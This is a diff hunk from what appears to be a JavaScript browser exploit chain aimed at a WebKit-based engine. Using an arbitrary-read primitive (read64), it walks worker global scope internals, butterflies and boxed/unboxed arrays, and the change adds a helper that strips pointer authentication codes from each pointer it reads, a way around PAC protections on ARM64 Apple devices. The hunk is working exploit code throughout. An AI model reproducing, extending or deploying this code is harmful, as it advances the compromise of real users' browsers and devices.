@@ -18060,26 +18060,40 @@ const device_chipset = {
               throw new TryAgainError(`stage1 could not find DedicatedWorkerGlobalScope, contexts_length=${contexts_length}`);
 
           resolverCheckpoint(`worker selected=${worker.hex()}`);
+          function stripPointerForRead(value, label) {
+              const stripped = value.noPAC();
+              if (stripped !== value)
+                  resolverCheckpoint(`${label}: stripped ${value.hex()} -> ${stripped.hex()}`);
+              return stripped;
+          }
           resolverCheckpoint(`reading worker script at ${(worker + 0x150n).hex()}`);
-          const script = read64(worker + 0x150n);
+          const scriptRaw = read64(worker + 0x150n);
+          resolverCheckpoint(`worker script raw=${scriptRaw.hex()}`);
+          const script = stripPointerForRead(scriptRaw, "worker script");
           resolverCheckpoint(`worker script=${script.hex()}`);
           resolverCheckpoint(`reading workerOrWorkletThread at ${(worker + 0x160n).hex()}`);
-          const workerOrWorkletThread = read64(worker + 0x160n);
+          const workerOrWorkletThreadRaw = read64(worker + 0x160n);
+          const workerOrWorkletThread = stripPointerForRead(workerOrWorkletThreadRaw, "workerOrWorkletThread");
           resolverCheckpoint(`workerOrWorkletThread=${workerOrWorkletThread.hex()}`);
           resolverCheckpoint(`reading Strong_globalScopeWrapper at ${(script + 0x20n).hex()}`);
-          const Strong_globalScopeWrapper = read64(script + 0x20n);
+          const Strong_globalScopeWrapperRaw = read64(script + 0x20n);
+          const Strong_globalScopeWrapper = stripPointerForRead(Strong_globalScopeWrapperRaw, "Strong_globalScopeWrapper");
           resolverCheckpoint(`Strong_globalScopeWrapper=${Strong_globalScopeWrapper.hex()}`);
           resolverCheckpoint(`reading globalScopeWrapper at ${Strong_globalScopeWrapper.hex()}`);
-          const globalScopeWrapper = read64(Strong_globalScopeWrapper);
+          const globalScopeWrapperRaw = read64(Strong_globalScopeWrapper);
+          const globalScopeWrapper = stripPointerForRead(globalScopeWrapperRaw, "globalScopeWrapper");
           resolverCheckpoint(`globalScopeWrapper=${globalScopeWrapper.hex()}`);
           resolverCheckpoint(`reading worker_global_butterfly at ${(globalScopeWrapper + 8n).hex()}`);
-          const worker_global_butterfly = read64(globalScopeWrapper + 8n);
+          const worker_global_butterfly_raw = read64(globalScopeWrapper + 8n);
+          const worker_global_butterfly = stripPointerForRead(worker_global_butterfly_raw, "worker_global_butterfly");
           resolverCheckpoint(`butterfly:${worker_global_butterfly.hex()}`);
           resolverCheckpoint(`reading unboxed_arr at ${worker_global_butterfly.hex()}`);
-          const unboxed_arr = read64(worker_global_butterfly);
+          const unboxed_arr_raw = read64(worker_global_butterfly);
+          const unboxed_arr = stripPointerForRead(unboxed_arr_raw, "unboxed_arr");
           resolverCheckpoint(`unboxed_arr=${unboxed_arr.hex()}`);
           resolverCheckpoint(`reading boxed_arr at ${(worker_global_butterfly + 8n).hex()}`);
-          const boxed_arr = read64(worker_global_butterfly + 8n);
+          const boxed_arr_raw = read64(worker_global_butterfly + 8n);
+          const boxed_arr = stripPointerForRead(boxed_arr_raw, "boxed_arr");
           resolverCheckpoint(`boxed_arr=${boxed_arr.hex()}`);
           resolverCheckpoint(`reading butterfly at ${(boxed_arr + 8n).hex()}`);
           const butterfly = read64(boxed_arr + 8n);
